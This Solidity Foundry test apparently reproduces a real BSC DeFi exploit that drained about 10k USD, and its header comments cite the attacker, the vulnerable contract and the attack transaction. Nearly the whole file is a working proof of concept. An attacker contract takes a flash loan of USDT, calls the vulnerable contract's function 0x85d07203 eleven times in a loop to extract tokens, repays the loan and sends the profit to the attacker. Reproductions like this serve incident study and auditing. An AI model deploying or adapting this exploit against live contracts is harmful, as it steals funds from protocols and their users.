pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 10k USD
// Attacker : https://bscscan.com/address/0x5af00b07a55f55775e4d99249dc7d81f5bc14c22
// Attack Contract : https://bscscan.com/address/0x6def9e4a6bb9c3bfe0648a11d3fff14447079e78
// Vulnerable Contract : https://bscscan.com/address/0x5fbbb391d54f4fb1d1cf18310c93d400bc80042e
// Attack Tx : https://bscscan.com/tx/0xbd330fd17d0f825042474843a223547132a49abb0746a7e762a0b15cf4bd28f6

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x5fbbb391d54f4fb1d1cf18310c93d400bc80042e

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1861430745572745245
// Twitter Guy : https://x.com/TenArmorAlert/status/1861430745572745245
// Hacking God : N/A

address constant BEP20USDT = 0x55d398326f99059fF775485246999027B3197955;
address constant DPP = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
address constant addr1 = 0x5fbBb391d54f4FB1d1CF18310c93d400BC80042E;
address constant attacker = 0x5af00B07a55F55775e4d99249DC7d81F5bc14c22;
address constant addr2 = 0x6deF9e4a6bb9C3bfE0648A11D3FfF14447079e78;


contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 44348366);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", IERC20(0x55d398326f99059fF775485246999027B3197955).balanceOf(attacker), 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        attC.transfer();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", IERC20(0x55d398326f99059fF775485246999027B3197955).balanceOf(attacker), 18);
    }
}

// 0x6deF9e4a6bb9C3bfE0648A11D3FfF14447079e78
contract AttackerC {
    function transfer() public {
        IBEP20USDT(BEP20USDT).approve(addr1, type(uint256).max);
        IDPP(DPP).flashLoan(0, 8255555 * 10**14, address(this), hex"3078");
    }

    function DPPFlashLoanCall(address /*sender*/, uint256 /*baseAmount*/, uint256 /*quoteAmount*/, bytes calldata /*data*/) external {
        for (uint256 idx = 0; idx < 11; idx++) {
            IBEP20USDT(BEP20USDT).transfer(addr1, (idx * 10**13) + (11 * 10**13));
            (bool s, ) = addr1.call(abi.encodeWithSelector(bytes4(0x85d07203), 2125 * 10**13 * 3600, address(this)));
            require(s, "call failed");
        }
        IBEP20USDT(BEP20USDT).transfer(DPP, 8255555 * 10**14);
        uint256 bal = IBEP20USDT(BEP20USDT).balanceOf(address(this));
        IBEP20USDT(BEP20USDT).transfer(attacker, bal);
    }
}

interface IBEP20USDT {
	function approve(address, uint256) external returns (bool);
	function balanceOf(address) external returns (uint256);
	function transfer(address, uint256) external returns (bool); 
}
interface IDPP {
	function flashLoan(uint256, uint256, address, bytes calldata) external; 
}